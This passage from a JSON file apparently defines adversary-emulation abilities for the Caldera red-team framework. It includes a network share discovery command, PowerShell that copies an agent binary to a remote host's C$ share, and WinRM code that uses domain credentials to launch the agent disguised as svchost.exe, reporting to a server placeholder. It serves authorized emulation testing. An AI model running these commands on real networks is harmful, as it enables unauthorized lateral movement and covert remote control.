"Network Share Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}, "cmd": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["deeac480-5c2a-42b5-90bb-41675ee53c7e", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30", "ability_name": "Copy 54ndc47 (SMB)", "ability_description": "Copy 54ndc47 to remote host (SMB)", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "ability_platforms": {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921", "ability_name": "Start Agent (WinRM)", "ability_description": "Start Agent using WinRM (WinRM)", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.006", "name": "Remote Services: Windows Remote Management"}, "ability_platforms": {"windows": {"psh": {"command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payloads": ["sandcat.go-windows"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}}